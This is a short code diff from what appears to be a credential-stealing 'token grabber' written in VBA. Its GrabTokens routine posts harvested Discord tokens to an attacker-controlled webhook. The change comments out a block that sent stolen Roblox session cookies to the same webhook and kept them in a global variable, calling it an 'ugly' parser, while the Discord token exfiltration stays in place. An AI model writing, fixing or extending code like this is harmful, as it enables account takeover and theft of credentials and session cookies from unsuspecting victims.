@@ -251,10 +251,11 @@ Sub GrabTokens(targetWH)
                         Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                     End If
                 End If
-                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
-                    globalCookie = Mid(l, 8) ' <--- STORES COOKIE GLOBALLY
-                End If
+                ' REMOVED THE UGLY ROBLOX PARSER HERE
+                ' If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+                '    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                '    globalCookie = Mid(l, 8)
+                ' End If
             End If
         Next
     End If
